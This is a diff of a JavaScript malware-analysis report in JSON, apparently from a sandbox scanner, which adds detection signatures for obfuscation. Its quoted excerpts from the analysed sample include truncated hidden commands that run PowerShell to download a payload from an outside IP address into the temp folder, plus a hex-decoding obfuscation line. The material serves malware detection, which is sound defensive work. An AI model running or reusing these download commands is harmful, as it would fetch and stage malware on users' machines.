@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 1413,
+    "score": 1433,
     "sections": [
       {
         "auto_collapse": false,
@@ -84,7 +84,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[16]()\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[16]()",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -108,7 +108,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "Object(s) are written to the DOM\n\t\tdocument[6].write(content) 1224 bytes\n",
+        "body": "Object(s) are written to the DOM\n\t\tdocument[6].write(content) 1224 bytes",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -132,7 +132,31 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[20](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
+        "body": "JavaScript uses parseInt to convert a string to an integer\n\t\tacApqOPr += String.fromCharCode(parseInt(aJQDXq.substr(anhBObj9, 2), 16))",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "parseint_usage": 10
+          },
+          "signatures": {
+            "parseint_usage": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: ParseIntUsage",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[20](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\tws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\\\...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -156,7 +180,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell via powershell.exe\n\t\t\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/16022...\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[20](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
+        "body": "JavaScript runs PowerShell via powershell.exe\n\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 ...\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[20](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\tws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\\\...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -180,7 +204,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell to call out to a URI\n\t\t\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/16022...\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[20](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
+        "body": "JavaScript runs PowerShell to call out to a URI\n\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 ...\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[20](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\tws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\\\...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -224,6 +248,30 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signature: RunsShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript uses charCodeAt/fromCharCode to obfuscate/de-obfuscate characters\n\t\tacApqOPr += String.fromCharCode(parseInt(aJQDXq.substr(anhBObj9, 2), 16))",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "suspicious_char_codes": 10
+          },
+          "signatures": {
+            "suspicious_char_codes": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: SuspiciousUseOfCharCodes",
         "zeroize_on_tag_safe": false
       },
       {
@@ -517,6 +565,13 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
+          "parseint_usage"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
           "runs_cmd_prompt"
         ]
       },
@@ -539,6 +594,13 @@
         "heur_id": 3,
         "signatures": [
           "runs_shell"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "suspicious_char_codes"
         ]
       },
       {
